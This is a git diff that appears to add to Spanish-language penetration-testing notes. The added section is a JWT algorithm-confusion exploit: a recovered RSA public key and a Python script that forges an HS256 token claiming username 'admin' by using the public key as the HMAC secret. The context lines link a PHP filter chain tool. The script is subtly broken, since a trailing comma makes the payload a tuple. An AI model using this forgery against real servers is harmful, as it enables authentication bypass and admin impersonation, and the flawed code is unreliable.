@@ -1452,3 +1452,71 @@ Escaneando red: 192.168.98.0/24 ...
 # php_filter_chain_generator
 
 https://github.com/synacktiv/php_filter_chain_generator
+
+
+
+
+
+
+
+# TOKEN JSON CREADO CON UNA clave publica
+
+## Para ello se necesita obligatorio una llave publica
+
+Ejemplo 
+```bash 
+└─$ cat public.pem 
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApDzyDfHCClQNka8/CF2q
+Il0c0hvfIYS6eFHvMW8z+ERBfUls3UijaFWHYMUKPEuWQIeDbbact225OZNVt6gH
+CyPP9DEmr0AEKTqd6vc0nAOFhRPim4wFe5Eedq5RVcqpRhd4uchEKGzYNa6XLm37
+lX0GmWt2dpWx/wcrGiBqvpCieh89CTUvINVhFHhFnX44T/3atJkXaYQu330wYs8v
+2ge/sEHI988fpGv74liVh7q/nhrOf8ZXFE3MOJNOp9sCtL4HFASAc/RXwuoErjW0
+tcAiatPYlrWIFezMpFXEiTf5vXG9Zj0K7vFhJUN+QaxTrmH988LhRxsMUhzZZ/sb
+nwIDAQAB
+-----END PUBLIC KEY-----
+```
+
+
+Explotación
+Con este llave vamos a intentar falsificar un Json Web Token esperando que el servidor esté mal configurado y únicamente firme el token con la llave pública que hemos encontrado.
+
+Para ello, usamos el siguiente script de python3:
+
+```bash 
+import json, base64, hmac, hashlib
+
+# Functions
+def b64url_encode(data):
+    s = base64.urlsafe_b64encode(data).rstrip(b"=")
+    return s.decode("ascii")
+
+def b64url_encode_json(obj):
+    j = json.dumps(obj, separators=(',', ':'), sort_keys=True)
+    return b64url_encode(j.encode('utf-8'))
+
+def hmac_sha256(key, msg):
+    return hmac.new(key, msg, hashlib.sha256).digest()
+
+def build_token(header_obj, payload_obj, key_bytes):
+    encoded_header = b64url_encode_json(header_obj)
+    encoded_payload = b64url_encode_json(payload_obj)
+    signing_input = (encoded_header + "." + encoded_payload).encode('ascii')
+    sig = hmac_sha256(key_bytes, signing_input)
+    encoded_sig = b64url_encode(sig)
+    return f"{encoded_header}.{encoded_payload}.{encoded_sig}"
+
+
+# Open public.pem
+with open("public.pem", "rb") as file:
+        key_bytes=file.read()
+
+# Create JWT
+header = {"alg": "HS256", "typ": "JWT"}
+
+payload = {"username": "admin"},
+
+token= build_token(header,payload, key_bytes)
+
+print("Token--> " + token)
+```
